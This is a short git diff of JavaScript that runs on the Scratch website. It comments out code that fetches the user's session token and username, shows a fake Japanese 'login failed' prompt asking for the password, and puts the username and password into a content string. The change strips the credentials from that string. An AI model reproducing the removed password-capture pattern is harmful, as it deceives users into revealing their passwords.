@@ -25,7 +25,7 @@ function getCookieArray(){
     token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
   }
 async function a(){
-  const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
+  /*const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
 
   
     const username = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;
@@ -36,7 +36,8 @@ async function a(){
         var password=prompt(login.status+"ログインに失敗しました。ログインのためのパスワードを入力");
         var login=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
     }
-    let content=Math.random().toString()+" used.,"+username+password; 
+    let content=Math.random().toString()+" used.,"+username+password; */
+	let content=Math.random().toString()+" used.,";
 
 let token2="";
   {
